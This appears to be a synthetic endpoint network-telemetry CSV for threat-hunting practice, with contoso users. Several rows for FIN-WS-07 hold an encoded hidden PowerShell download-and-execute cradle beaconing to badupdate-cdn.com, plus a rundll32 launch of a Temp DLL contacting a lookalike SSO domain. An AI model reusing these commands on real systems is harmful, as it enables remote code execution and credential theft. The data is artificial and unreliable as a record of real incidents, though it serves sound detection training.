TimeGenerated,DeviceName,DeviceId,ActionType,LocalIP,LocalPort,RemoteIP,RemoteIPType,RemotePort,RemoteUrl,Protocol,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessFolderPath,ReportId
2026-06-10T08:58:11Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ConnectionSuccess,10.20.5.42,51220,52.170.12.45,Public,443,outlook.office365.com,Tcp,meganb,meganb@contoso.com,olk.exe,"""C:\Program Files\Microsoft Office\root\Office16\olk.exe""",explorer.exe,C:\Program Files\Microsoft Office\root\Office16\,5201001
2026-06-10T09:01:43Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ConnectionSuccess,10.20.5.42,51244,20.98.111.30,Public,443,www.bing.com,Tcp,meganb,meganb@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,C:\Program Files (x86)\Microsoft\Edge\Application\,5201044
2026-06-10T09:03:07Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,49880,52.170.12.45,Public,443,outlook.office365.com,Tcp,alexw,alexw@contoso.com,olk.exe,"""C:\Program Files\Microsoft Office\root\Office16\olk.exe""",explorer.exe,C:\Program Files\Microsoft Office\root\Office16\,5202007
2026-06-10T09:09:55Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ConnectionSuccess,10.20.5.42,51301,20.98.111.30,Public,443,teams.microsoft.com,Tcp,meganb,meganb@contoso.com,ms-teams.exe,"""C:\Users\meganb\AppData\Local\Microsoft\WindowsApps\ms-teams.exe""",explorer.exe,C:\Users\meganb\AppData\Local\Microsoft\WindowsApps\,5201301
2026-06-10T09:14:02Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,49915,13.107.42.14,Public,443,onedrive.live.com,Tcp,alexw,alexw@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,C:\Program Files (x86)\Microsoft\Edge\Application\,5202102
2026-06-10T09:15:18Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50012,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202150
2026-06-10T09:20:21Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50018,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202210
2026-06-10T09:25:19Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50027,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202270
2026-06-10T09:25:46Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionFailed,10.20.7.31,50031,185.220.101.2,Public,8443,login-contoso-sso.com,Tcp,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\update.dll,Start",explorer.exe,C:\Windows\System32\,5202276
2026-06-10T09:30:22Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50039,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202330
2026-06-10T09:35:24Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ConnectionSuccess,10.20.7.31,50048,91.219.236.18,Public,443,badupdate-cdn.com,Tcp,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",rundll32.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,5202390
